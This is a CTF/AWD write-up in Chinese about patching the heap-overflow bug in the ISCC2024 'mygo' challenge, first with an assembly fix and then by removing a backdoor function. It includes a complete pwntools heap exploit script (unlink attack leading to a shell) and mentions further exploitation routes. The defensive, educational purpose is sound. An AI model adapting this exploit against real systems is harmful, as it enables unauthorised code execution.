#### 1:[ISCC2024]mygo(fix)

简单的讲一下[ISCC2024]mygo是怎么fix的.

首先,我们知道,题目的主要漏洞点在edit_song没有判断chunk的大小,而是使用用户输入的值作为chunk的大小.这导致了相当明显的堆溢出,如下图所示.

![mygofix0](C:\Users\POI\Desktop\周报\周报07\mygofix0.png)

那么我们可以很自然的联想到和栈溢出相同的修复思路:将size设为一个不会引起溢出的大小.虽然这题的程序并没有在任何地方保存chunk数据域的大小,但chunk本身的size域是无论如何都会存在的.正好程序将chunk的数据域指针保存在了rax中,而chunk的size域指针就在它前面0x8的位置.于是我们形成思路如下:

1. 将rsi设为[rax-0x8]
2. 将rsi的最低3位置为0
3. 将rsi减去0x8

为什么要将rsi的低3位置0?因为由于标志位的原因,如果一个chunk的前面一个chunk正在使用,那么它的size的最低位就会为1.在这种情况下,很可能会产生off_by_one漏洞,使我们的修复没有起到应有的效果.剩下两个标志位出于相似的原因,我们也应该将它置0.

为什么是将rsi减去0x8,而非减去0x10得到数据域的正确大小?因为正在使用的chunk可以将物理位置相邻的chunk的pre_size用于存储数据.如果我们选择减去0x10的话,就可能导致当用户申请的空间为0x\*8~0x\*F时程序无法正常运作.

那么根据这个思路,我们编写代码如下:

```assembly
	mov     rsi, [rax-8]
	and     si, 0FFF8h
	sub     rsi, 8
```

不过我们还面临一个问题:这三条语句的长度为0xC字节,而原本设置rsi的两句语句长度只有0x7字节.不过好在这段汇编代码中有足足三处`mov *,0`这样的语句,我们每将一处改为`xor *,*` ,就能为我们省出0x3字节的空间.这样我们就完全不需要`jmp`来`jmp`去了.

那么最终,我们编写代码如下:

![mygofix1](C:\Users\POI\Desktop\周报\周报07\mygofix1.png)

#### 2:不需要很累很麻烦也能修好的mygo(谁家千早爱音)

众所周知,在awd赛制中,我们修一道题的最终目的,就是防止别人打(废话).但是,要想防止别人打,我们不一定需要修.

就拿mygo这道题来说,这是我写的脚本:

```python
from pwn import*
context.log_level='debug'
context.arch='amd64'

r=process("./mygo")
pause()
def cre_s(size,content):
    r.recvuntil(b"Your choice :")
    r.sendline(b"1")
    r.sendline(str(size))
    r.send(content)

def edi_s(index,size,content):
    r.recvuntil(b"Your choice :")
    r.sendline(b"2")
    r.sendline(str(index))
    r.sendline(str(size))
    r.send(content.ljust(size,b'\x00'))

def del_s(index):
    r.recvuntil(b"Your choice :")
    r.sendline(b"3")
    r.sendline(str(index))

def itsmygo():
    r.recvuntil(b"Your choice :")
    r.sendline(b"947")

heap_add=0x6020E0

cre_s(0x48,b'a')
cre_s(0x80,b'a')
cre_s(0x80,b'a')

pay1=p64(0)+p64(0x41)+p64(heap_add-0x18)+p64(heap_add-0x10)+b'a'*0x20+p64(0x40)+p64(0x90)
edi_s(0,0x50,pay1)
del_s(1)
edi_s(0,0x20,p64(0)*3+p64(0x6020c0))
edi_s(0,0x8,p64(0x1306))
itsmygo()

r.interactive()
```

可以看到这个脚本写的没什么问题,稍微改改应该也能去打线上.

但如果我们想防住这个脚本,并不需要像上面那样去真正修改它.

看到这个mygo了吗?

![mygofix2](C:\Users\POI\Desktop\周报\周报07\mygofix2.png)![mygofix3](C:\Users\POI\Desktop\周报\周报07\mygofix3.png)

好了,修好了.(我是来结束乐队的.jpg)

由于上面的那个解题脚本依赖后门函数获取shell,所以我们只需要把后门函数删了,上面的脚本就拿不到shell了(又是经典的废话环节).虽然这题就算删了后门函数,也能通过修改got表,或者用unsorted_bin_attack泄露libc基址后直接用one_gadget解题(甚至unlink都不是必须的,完全可以通过制造chunk重叠来实现任意地址写),但是**谁会这么吃饱了撑的**.而别的队伍也拿不到你修完的二进制文件,所以他们也不知道你是怎么修的.只要主办方不要让pwn手吃的太饱,这么修应该也能解决大部分问题.

当然,就算你已经按照正常方法修复了漏洞,也建议把后门函数删了以防万一.最好把`/bin/sh`字符串也给删了,或者把/bin/sh改成cat ./*之类的来增加别人的血压.

